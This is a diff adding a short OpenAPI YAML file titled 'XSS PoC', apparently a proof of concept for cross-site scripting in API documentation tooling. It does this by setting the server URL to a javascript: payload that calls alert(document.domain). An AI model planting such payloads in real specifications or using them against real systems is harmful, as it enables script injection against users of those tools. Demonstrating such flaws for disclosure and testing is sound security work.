@@ -1,0 +1,23 @@
+openapi: "3.0.3"
+info:
+  title: "XSS PoC"
+  version: "1.0.0"
+servers:
+  - url: "javascript://%0aalert(document.domain)//"
+paths:
+  /users:
+    get:
+      operationId: getUsers
+      security:
+        - oauth2: []
+      responses:
+        "200":
+          description: OK
+components:
+  securitySchemes:
+    oauth2:
+      type: oauth2
+      flows:
+        implicit:
+          authorizationUrl: "/oauth2/authorize"
+          scopes: {}
